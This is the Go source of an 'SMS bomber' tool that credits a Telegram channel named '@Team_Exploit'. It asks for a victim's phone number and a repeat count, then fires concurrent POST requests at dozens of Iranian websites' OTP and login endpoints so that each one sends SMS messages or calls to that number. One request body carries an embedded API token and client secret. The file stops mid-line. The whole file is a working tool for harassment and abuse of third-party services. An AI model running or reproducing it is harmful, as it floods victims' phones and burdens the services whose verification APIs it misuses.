package main

import (
        "bytes"
        "encoding/json"
        "fmt"
        "net/http"
        "os"
        "os/exec"
        "runtime"
        "time"
)

/*
Channel telegram : @esfelurm or @Team_Exploit
===============================================
Link Github : https://github.com/esfelurm
===============================================
Sms Bomber pro v1
*/
func clearScreen() {
        cmd := exec.Command("clear")
        if runtime.GOOS == "windows" {
                cmd = exec.Command("cmd", "/c", "cls")
        }
        cmd.Stdout = os.Stdout
        cmd.Run()
}
func sms(url string, header map[string]interface{}, ch chan<- int) {
        //time.Sleep(3 * time.Second)
        jsonData, err := json.Marshal(header)
        if err != nil {
                fmt.Println("\033[01;31m[-] Error ! ")
                ch <- http.StatusInternalServerError
                return
        }
        time.Sleep(3 * time.Second)
        resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
        time.Sleep(3 * time.Second)
        if err != nil {
                fmt.Println("\033[01;31m[-] Error ! ")
                ch <- http.StatusInternalServerError
                return
        }
        ch <- resp.StatusCode
}

func main() {
        // red := "\033[01;31m"
        // green := "\033[01;32m"
        // yellow := "\033[01;33m"
        clearScreen()
        fmt.Println("\033[01;33m")
        fmt.Println(` 
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                    
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                  
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.                
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:               
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.              
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..              
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.              
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#              
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:             
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-             
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:             
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#              
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:              
             *@@%#            -@@@@@@.            #@@@+               
             .%@@# @esfelurm  +@@@@@@= Sms Bomber #@@#                
              :@@*           =%@@@@@@%-           *@@:                
              #@@%         .*@@@@#%@@@%+.         %@@+                
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*                
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=                
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*                 
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                  
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                    
                      #@@@@@@@@@@@@@@@@@@@@@@+                        
                       *@@@@@@@@@@@@@@@@@@@@+                         
                        +@@%*@@%@@@%%@%*@@%=                          
                         +%+ %%.+@%:-@* *%-                           
                          .  %# .%#  %+                               
                             :.  %+  :.                               
                                 -:                                                                                                                                                                                                                                                             

        `)
        var phone string
        fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
        fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
        fmt.Scan(&phone)

        var repeatCount int
        fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
        fmt.Scan(&repeatCount)

        ch := make(chan int)

        for i := 0; i < repeatCount; i++ {
                go sms("https://3tex.io/api/1/users/validation/mobile", map[string]interface{}{
                        "receptorPhone": phone,
                }, ch)
                go sms("https://deniizshop.com/api/v1/sessions/login_request", map[string]interface{}{
                        "mobile_phone": phone,
                }, ch)
                go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
                        "userKey": phone,
                }, ch)
                go sms("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
                        "cellphone": phone,
                }, ch)
                go sms("https://bck.behtarino.com/api/v1/users/phone_verification/", map[string]interface{}{
                        "phone": phone,
                }, ch)
                go sms("https://abantether.com/users/register/phone/send/", map[string]interface{}{
                        "phoneNumber": phone,
                }, ch)
                s57 := fmt.Sprintf("phone=%s&call=yes", phone)
                go sms("https://novinbook.com/index.php?route=account/phone", map[string]interface{}{
                        s57: phone,
                }, ch)
                go sms(fmt.Sprintf("https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=%s", phone), map[string]interface{}{
                        "esfelurm": "esfelurm",
                }, ch)
                go sms("https://api.pooleno.ir/v1/auth/check-mobile", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://agent.wide-app.ir/auth/token", map[string]interface{}{
                        "'grant_type': 'otp', 'client_id': '62b30c4af53e3b0cf100a4a0', 'phone'": phone,
                }, ch)
                sm := fmt.Sprintf("'credential': {'phoneNumber': %s, 'role': 'PASSENGER'}", phone)
                go sms("https://tap33.me/api/v2/user", map[string]interface{}{
                        sm: phone,
                }, ch)
                go sms("https://web.emtiyaz.app/json/login", map[string]interface{}{
                        "send=1&cellphone=": phone,
                }, ch)
                go sms("https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
                        "phone": phone,
                }, ch)
                se := fmt.Sprintf("'api_version': '3', 'method': 'sendCode', 'data': {'phone_number': %s, 'send_type': 'SMS'}", phone)
                go sms("https://messengerg2c4.iranlms.ir/", map[string]interface{}{
                        se: phone,
                }, ch)
                go sms("https://nx.classino.com/otp/v1/api/login", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://bama.ir/signin-checkforcellnumber", map[string]interface{}{
                        "cellNumber=": phone,
                }, ch)
                go sms("https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa", map[string]interface{}{
                        "cellphone": phone,
                }, ch)
                go sms("https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
                        "phoneNumber": phone,
                }, ch)
                // go sms("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0", map[string]interface{}{
                //         "":phone}, ch)
                go sms("https://api.bitbarg.com/api/v1/authentication/registerOrLogin", map[string]interface{}{
                        "phone": phone,
                }, ch)
                go sms("https://api.bahramshop.ir/api/user/validate/username", map[string]interface{}{
                        "username": phone,
                }, ch)
                go sms("https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
                        "phone": phone,
                }, ch)
                go sms("https://takshopaccessorise.ir/api/v1/sessions/login_request", map[string]interface{}{
                        "mobile_phone": phone,
                }, ch)
                go sms("https://api.bitpin.ir/v1/usr/sub_phone/", map[string]interface{}{
                        "phone=": phone,
                }, ch)
                go sms("https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
                        "phoneNumber": phone,
                }, ch)
                go sms("https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
                        "userName": phone,
                }, ch)
                go sms("https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://bit24.cash/app/api/auth/check-mobile", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://app.itoll.ir/api/v1/auth/login", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://api.raybit.net:3111/api/v1/authentication/register/mobile", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://www.pubisha.com/login/checkCustomerActivation", map[string]interface{}{
                        "mobile=": phone,
                }, ch)
                go sms("https://farvi.shop/api/v1/sessions/login_request", map[string]interface{}{
                        "mobile_phone": phone,
                }, ch)
                go sms("https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
                        "contact": phone,
                }, ch)
                go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", map[string]interface{}{
                        "UserName": phone,
                }, ch)
                go sms("https://www.sheypoor.com/auth", map[string]interface{}{
                        "username": phone,
                }, ch)
                go sms("https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
                        "phone": phone,
                }, ch)
                go sms("https://a4baz.com/api/web/login", map[string]interface{}{
                        "cellphone": phone,
                }, ch)
                go sms("https://api.anargift.com/api/people/auth", map[string]interface{}{
                        "user": phone,
                }, ch)
                go sms("https://nobat.ir/api/public/patient/login/phone", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://www.buskool.com/send_verification_code", map[string]interface{}{
                        "phone": phone,
                }, ch)
                go sms("https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
                        "'Parameters': {'ApplicationType': 'Web','ApplicationUniqueToken': None, 'ApplicationVersion': '1.0.0','MobileNumber': +": phone,
                }, ch)
                go sms("https://www.simkhanapi.ir/api/users/registerV2", map[string]interface{}{
                        "mobileNumber": phone,
                }, ch)
                go sms("https://sandbox.sibirani.ir/api/v1/user/invite", map[string]interface{}{
                        "username": phone,
                }, ch)
                go sms("https://shop.hyperjan.ir/api/users/manage", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
                        "username": phone,
                }, ch)
                go sms("https://hiword.ir/wp-json/otp-login/v1/login", map[string]interface{}{
                        "identifier": phone,
                }, ch)
                go sms("https://abantether.com/users/register/phone/send/", map[string]interface{}{
                        "phoneNumber": phone,
                }, ch)
                go sms("https://api.bit24.cash/api/v3/auth/check-mobile", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://dicardo.com/main/sendsms", map[string]interface{}{
                        "phone": phone,
                }, ch)
                go sms("https://ghasedak24.com/user/ajax_register", map[string]interface{}{
                        "username": phone,
                }, ch)
                go sms("https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
                        "CellPhone": phone,
                }, ch)
                go sms("https://www.digistyle.com/users/login-register/", map[string]interface{}{
                        "loginRegister[email_phone]": phone,
                }, ch)
                go sms("https://banankala.com/home/login", map[string]interface{}{
                        "Mobile": phone,
                }, ch)
                go sms("https://www.iranketab.ir/account/register", map[string]interface{}{
                        "UserName": phone,
                }, ch)
                go sms("https://ketabchi.com/api/v1/auth/requestVerificationCode", map[string]interface{}{
                        "phoneNumber": phone,
                }, ch)
                go sms("https://www.offdecor.com/index.php?route=account/login/sendCode", map[string]interface{}{
                        "phone": phone,
                }, ch)
                go sms("https://exo.ir/index.php?route=account/mobile_login", map[string]interface{}{
                        "mobile_number": phone,
                }, ch)
                go sms("https://shahrfarsh.com/Account/Login", map[string]interface{}{
                        "phoneNumber=": phone,
                }, ch)
                go sms("https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", map[string]interface{}{
                        "phone_email": phone,
                }, ch)
                go sms("https://shop.beheshticarpet.com/my-account/", map[string]interface{}{
                        "billing_mobile": phone,
                }, ch)
                go sms("https://www.khanoumi.com/accounts/sendotp", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://rojashop.com/api/auth/sendOtp", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://dadpardaz.com/advice/getLoginConfirmationCode", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://api.rokla.ir/api/request/otp", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://khodro45.com/api/v1/customers/otp/", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://mashinbank.com/api2/users/check", map[string]interface{}{
                        "mobileNumber": phone,
                }, ch)
                go sms("https://api.pezeshket.com/core/v1/auth/requestCode", map[string]interface{}{
                        "mobileNumber": phone,
                }, ch)
                go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
                        "'method': 'phone', 'identifier'": phone,
                }, ch)
                go sms("https://api.timcheh.com/auth/otp/send", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://client.api.paklean.com/user/resendCode", map[string]interface{}{
                        "username": phone,
                }, ch)
                go sms("https://mobogift.com/signin", map[string]interface{}{
                        "username": phone,
                }, ch)
                go sms("https://api.iranicard.ir/api/v1/register", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://tj8.ir/auth/register", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://mashinbank.com/api2/users/check", map[string]interface{}{
                        "mobileNumber": phone,
                }, ch)
                go sms("https://cinematicket.org/api/v1/users/signup", map[string]interface{}{
                        "phone_number": phone,
                }, ch)
                go sms("https://www.irantic.com/api/login/request", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://kafegheymat.com/shop/getLoginSms", map[string]interface{}{
                        "phone": phone,
                }, ch)
                go sms("https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85", map[string]interface{}{
                        "cellphone": phone,
                }, ch)
                go sms("https://www.delino.com/user/register", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://alopeyk.com/api/sms/send.php", map[string]interface{}{
                        "phone": phone,
                }, ch)
                go sms("https://1401api.tamland.ir/api/user/signup", map[string]interface{}{
                        "Mobile": phone,
                }, ch)
                go sms("https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", map[string]interface{}{
                        "telephone": phone,
                }, ch)
                go sms("https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
                        "phone": phone,
                }, ch)
                go sms("https://melix.shop/site/api/v1/user/otp", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://safiran.shop/login", map[string]interface{}{
                        "mobile": phone,
                }, ch)
                go sms("https://restaurant.delino.com/user/register", map[string]interface{}{
                        "'apiToken':'VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq','clientSecret':'7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq','device':'web','use